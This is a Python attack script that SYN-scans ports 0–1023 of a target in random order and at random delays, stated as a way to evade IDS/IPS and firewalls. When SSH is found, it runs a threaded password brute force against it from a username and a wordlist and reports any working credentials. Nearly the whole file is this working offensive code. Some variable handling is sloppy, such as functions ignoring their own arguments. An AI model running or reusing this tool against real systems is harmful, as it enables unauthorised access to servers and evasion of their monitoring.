# This project is a Port scanner that checks the all the registered ports
# it checks the ports randomly and in random times to evade IDS/IPS, and firewalls.
# if The Program detects that SSH is open than it gives you a Option to Brute Force it.
# if 'Y' is chosen than after specifing a username and a password list the program will run a Threaded Bruteforce on the SSH service.


from scapy.all import *
from scapy.layers.inet import TCP, IP, sr1, ICMP
import paramiko
import socket
from time import sleep
import threading
import IPy

RED, REGULAR, GREEN, YELLOW = '\33[31m', '\33[37m', '\33[32m', '\33[33m'
Target = input(f"[+] Enter Target (IP): ")
stop_flag = 0
Registered_ports = [i for i in range(0, 1024)] # can be set to be any number of ports
random.shuffle(Registered_ports)
open_ports = []


def check_ip_address():
    try:
        IP(Target)
        return Target
    except:
        socket.gethostbyname(Target)
        return Target


def target_availability():
    conf.verb = 0
    ping = sr1(IP(dst=check_ip_address()) / ICMP(), timeout=3)
    return True if ping is not None else (print(f"{RED}[!] {Target} Doesnt respond to ping [!]{REGULAR}"), exit(0))


def scan_port(port_num):
    conf.verb = 0
    syn_packet = sr1(IP(dst=check_ip_address()) / TCP(sport=RandShort(), dport=port_num, flags="S"), timeout=1, verbose=0)
    if syn_packet is not None and (syn_packet.haslayer(TCP)) and (syn_packet.getlayer(TCP).flags == 0x12):
        sr(IP(dst=check_ip_address()) / TCP(sport=RandShort(), dport=port_num, flags="R"), timeout=1, verbose=0)
        print(f"{GREEN}[+] Port {port} is open.{REGULAR}")
        open_ports.append(port)
    else:
        pass


def brute_force(ssh_user, ssh_pass):
    global stop_flag
    print('\n')
    print(f"[+] {YELLOW}Trying: '{ssh_user}:{ssh_pass}'{REGULAR}")
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh_client.connect(check_ip_address(), port=22, username=username, password=password, timeout=1)
        print(f"\n{GREEN}{'-'*43}\n[+] Successfully found credentials: {YELLOW}{username}:{password}\n{GREEN}{'-'*43}")
        stop_flag = 1
        exit(0)
    except:
        pass
    ssh_client.close()

target_availability() if Target else exit(0)
for port in Registered_ports:
    scan_port(port)
    sleep(random.randint(10, 100) / random.randint(1, 10)) #Disable this for faster scanning and not in randomized times.

print(f"{YELLOW}\n[!] THE SCAN IS FINISHED [!]{REGULAR}")
print(f"{GREEN}\n## THE OPEN PORTS ARE: {YELLOW}{open_ports}  ##{REGULAR}")

if 22 in open_ports:
    print(f"{REGULAR}\n[+][+] Detected port 22 open checking version....")
    conn = socket.socket()
    s = conn.connect((Target, 22))
    check = conn.recv(100).decode()
    print(f"[+][+] version : {GREEN}{check}{REGULAR}")
    conn.close()
    q = input(f"\n{YELLOW}SSH s open would you like to Brute Force? (y/n){REGULAR}")[0].upper() if "SSH" in check else exit(0)
    if q == "Y":
        username = input("\nEnter Username: ")
        wordlist = input("Path to password wordlist: ")
        with open(wordlist, 'r') as f:
            pass_wordlist = f.readlines()
            for line in pass_wordlist:
                if stop_flag == 1:
                    t.join()
                    exit(0)
                password = line.strip()
                t = threading.Thread(target=brute_force, args=(username, password,))
                t.start()
                sleep(0.4)
    else:
        print("Good Bye! ")
        exit(0)
        
